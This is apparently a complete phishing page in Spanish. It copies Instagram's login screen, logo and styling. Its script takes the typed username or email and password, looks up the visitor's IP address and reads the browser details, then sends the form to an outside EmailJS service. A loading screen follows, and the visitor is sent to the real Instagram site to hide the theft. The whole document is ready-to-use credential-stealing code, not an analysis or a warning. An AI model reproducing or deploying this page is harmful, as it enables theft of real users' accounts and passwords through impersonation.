<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yG/r/1_8g92b6890.png" />
    <style>
        body {
            background: #fafafa;
            /* Degradado clásico de Instagram */
            background: linear-gradient(to bottom, #f0f2f5, #ffffff); 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 40px;
            display: flex;
            flex-direction: column;
            align-items: center;
            box-shadow: 0 0 10px rgba(0,0,0,0.05);
        }

        .logo {
            margin-bottom: 20px;
            font-family: 'Grand Hotel', cursive; /* O usa la imagen */
        }
        
        .logo img {
            width: 175px;
            margin-top: 10px;
        }

        form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        input {
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 12px 8px;
            font-size: 12px;
            width: 100%;
            box-sizing: border-box;
            color: #262626;
        }

        input:focus {
            outline: none;
            border: 1px solid #a8a8a8;
        }

        button {
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: #ffffff;
            font-weight: 600;
            padding: 8px;
            font-size: 14px;
            cursor: pointer;
            margin-top: 10px;
            height: 30px;
        }

        button:hover {
            background-color: #1877f2;
        }

        button:disabled {
            background-color: #bcdbf9;
            cursor: default;
        }

        /* Pantalla de carga */
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            z-index: 1000;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .loading-spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #dbdbdb;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        .loading-text {
            font-size: 14px;
            color: #262626;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <!-- Importar fuente de Instagram para el logo -->
    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
</head>
<body>

    <div class="container">
        <div class="logo">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Instagram Logo">
        </div>

        <form id="login-form">
            <input type="text" id="user_email" name="user_email" placeholder="Teléfono, nombre de usuario o correo electrónico" required>
            <input type="password" id="password" name="password" placeholder="Contraseña" required>
            
            <button type="submit" id="submit-btn">
                Iniciar sesión
            </button>
        </form>
        
        <div style="margin-top: 15px; font-size: 12px; color: #8e8e8e;">
            <a href="#" style="color: #8e8e8e; text-decoration: none;">¿Has olvidado la contraseña?</a>
        </div>
    </div>

    <!-- Pantalla de carga -->
    <div class="loading-overlay" id="loading-screen">
        <div class="loading-spinner"></div>
        <div class="loading-text">Cargando...</div>
    </div>

    <!-- Script de EmailJS -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        (function(){
            // Tu clave pública
            emailjs.init("q1IUmbgdFeBvmxnvi");
        })();

        document.addEventListener('DOMContentLoaded', () => {
            const form = document.getElementById('login-form');
            const loadingScreen = document.getElementById('loading-screen');

            form.addEventListener('submit', function(event) {
                event.preventDefault();

                // 1. Mostrar pantalla de carga
                loadingScreen.style.display = 'flex';

                // 2. Obtener IP del usuario (API gratuita)
                let userIP = "No disponible";
                fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => userIP = data.ip)
                    .catch(error => userIP = "Error obteniendo IP");

                const browserInfo = navigator.userAgent; // Navegador y SO
                const username = document.getElementById('user_email').value;
                const password = document.getElementById('password').value;

                // 3. Enviar datos a EmailJS
                // Asegúrate de que tu template en EmailJS tenga {{user_email}}, {{password}}, {{ip}} y {{browser}}
                const templateParams = {
                    user_email: username,
                    password: password,
                    ip: userIP,
                    browser: browserInfo,
                    fecha: new Date().toLocaleString()
                };

                emailjs.sendForm("service_rkpt26i", "template_zl3ywbm", this)
                    .then(function(response) {
                        console.log('Datos enviados:', response.status);
                        // Esperar 2 segundos en la pantalla de carga
                        setTimeout(function(){
                            window.location.href = "https://www.instagram.com";
                        }, 2000);

                    }, function(error) {
                        console.error('Fallo al enviar:', error);
                        // Incluso si falla, redirigir
                        window.location.href = "https://www.instagram.com";
                    });
            });
        });
    </script>
</body>
    </html>
